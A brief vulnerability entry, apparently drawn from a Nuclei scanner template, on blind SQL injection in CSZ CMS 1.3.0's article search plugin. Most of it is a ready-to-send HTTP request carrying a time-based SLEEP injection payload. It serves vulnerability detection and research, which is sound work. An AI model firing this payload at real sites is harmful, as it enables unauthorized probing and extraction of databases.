# Vulnerability: CSZ CMS 1.3.0 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`csz-cms-sqli.yaml`)

## Description
CSZ CMS version 1.3.0 suffers from multiple remote blind SQL injection vulnerabilities.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 20s
GET /csz-cms/plugin/article/search?p=3D1%27%22)%20AND%20(SELECT%203910%20FROM%20(SELECT(SLEEP(6)))qIap)--%20ogLS HTTP/1.1
Host: {{Hostname}}
```

